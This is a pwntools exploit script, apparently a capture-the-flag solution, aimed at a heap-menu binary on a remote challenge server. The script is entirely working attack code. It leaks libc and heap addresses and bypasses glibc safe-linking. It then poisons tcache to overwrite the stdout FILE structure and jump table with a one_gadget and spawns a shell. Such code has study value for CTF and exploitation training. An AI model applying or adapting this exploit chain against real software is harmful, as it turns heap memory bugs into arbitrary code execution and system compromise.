from pwn import *
from time import sleep
import re

gs = '''
set breakpoint pending on
break _IO_flush_all_lockp
enable breakpoints once 1
continue
'''

#p=process("./pwnme")
p=remote("0.cloud.chals.io",10605)

#context.terminal = ['tmux', 'splitw', '-h']
#p=gdb.debug("./pwnme", gdbscript=gs)
#gdb.attach(p)
libc = ELF("./libc.so.6")
elf=ELF("./pwnme")

def malloc(ind, size, payload):
    global p
    r1 = p.sendlineafter(b">", "1")
    r2 = p.sendlineafter(b">", str(ind))
    r3 = p.sendlineafter(b">", str(size))
    r4 = p.sendlineafter(b">",payload)
    return r1+r2+r3+r4

def malloc_no_out(ind, size, payload):
    global p
    sleep(1)
    p.sendline("1")
    sleep(1)
    p.sendline(str(ind))
    sleep(1)
    p.sendline(str(size))
    sleep(1)
    p.sendline(payload)

def free(ind):
    global p
    r1 = p.sendlineafter(b">", "2")
    r2 = p.sendlineafter(b">", str(ind))
    return r1 + r2

def free_no_out(ind):
    global p
    sleep(1)
    p.sendline("2")
    sleep(1)
    p.sendline(str(ind))
    sleep(1)

def edit(ind, payload):
    global p
    r1 = p.sendlineafter(b">","3")
    r2 = p.sendlineafter(b">",str(ind))
    r3 = p.sendlineafter(b">",payload)
    return r1+r2+r3

def edit_no_out(ind, payload):
    global p
    sleep(1)
    p.sendline("3")
    sleep(1)
    p.sendline(str(ind))
    sleep(1)
    p.sendline(payload)

def view(ind):
    global p
    r1 = p.sendlineafter(b">", "4")
    r2 = p.sendlineafter(b">", str(ind))
    leak = p.recvuntil(b"addresses.");
    return leak

def raw2leak(resp):
    leakr=resp[1:].split(b"\n")[0]
    return u64(leakr.ljust(8, b'\x00'))

def decrypt(leak):
    key=0
    res=0
    for i in range(1,6):
        bits=64-12*i
        if bits < 0:
            bits = 0
        res = ((leak ^ key) >> bits) << bits
        key = res >> 12
    return res

#GOAL 0: make a glibc leak by creating an unsorted size then a buffer chunk and freeing the big one:
print(malloc(50, 0x420, "hi there"))
print(malloc(51, 24, "smol"))
print(free(50))
raw = view(50)
leakr=raw[1:].split(b"\n")[0]
glibcleak = u64(leakr.ljust(8, b'\x00'))
libc.address = glibcleak - (libc.sym.main_arena+96)
one_gadget = 0xda811 + libc.address
filler = libc.sym._IO_2_1_stdout_ - 131
stdout_FILE = (p64(filler)*4
        + p64(filler + 1)*2
        + p64(filler)
        + p64(filler + 1)
        + p64(0)*4
        + p64(libc.sym._IO_2_1_stdin_)
        + p64(1)
        + p64(0xffffffffffffffff)
        + p64(0x0)
        + p64(libc.sym._IO_stdfile_1_lock)
        + p64(0xffffffffffffffff)
        + p64(0)
        + p64(libc.sym._IO_wide_data_1)
        + p64(0x0)*3 )


#OK targeting _IO_2_1_stdout_ -16 or -32

malloc(0, 0x368, "chunk0")
malloc(1, 0x368, "chunk1")
malloc(2, 0x378, "chunk2")
malloc(3, 0x378, "chunk3")
malloc(4, 24, "smol2")
free(0)
free(1)
free(2)
free(3)
print("commencing heap leak")
heapleap = decrypt(raw2leak(view(1)))
heapleap = (heapleap >> 12) << 12
print(hex(heapleap))

edit(1, p64( (libc.sym._IO_2_1_stdout_) ^ (heapleap >> 12)) + p64(heapleap) )
edit_no_out(3, p64( (libc.sym.__GI__IO_file_jumps) ^ (heapleap >> 12)) + p64(heapleap) )
malloc(5, 0x368, "junk")
malloc(6, 0x378, "junk2")
print("wait for it...")
malloc_no_out(7, 0x368, p64(0xfbad2887) + stdout_FILE + p32(1) + p32(0) )

#print(hex(filler))
gi_jump = (p64(0)*2 +
        p64(one_gadget)+#p64(libc.sym._IO_new_file_finish)+
        p64(one_gadget)+#p64(libc.sym._IO_new_file_overflow)+
        p64(libc.sym._IO_new_file_underflow)+
        p64(libc.sym.__GI__IO_default_uflow)+
        p64(libc.sym.__GI__IO_default_pbackfail)+
        p64(libc.sym._IO_new_file_xsputn)+
        p64(libc.sym.__GI__IO_file_xsgetn)+
        p64(libc.sym._IO_new_file_seekoff)+
        p64(libc.sym._IO_default_seekpos)+
        p64(libc.sym._IO_new_file_setbuf)+
        p64(libc.sym._IO_new_file_sync)+
        p64(libc.sym.__GI__IO_file_doallocate)+
        p64(libc.sym.__GI__IO_file_read)+
        p64(libc.sym._IO_new_file_write)+
        p64(libc.sym.__GI__IO_file_seek)+

        p64(libc.sym.__GI__IO_file_close)+
        p64(libc.sym.__GI__IO_file_stat)+
        p64(libc.sym._IO_default_showmanyc)+
        p64(libc.sym._IO_default_imbue))
print(gi_jump)
malloc_no_out(8, 0x378, gi_jump)
edit_no_out(7, b"/bin/sh\x00" + stdout_FILE+p32(0xffffffff))
print("ready")
p.sendline("5")
p.interactive()
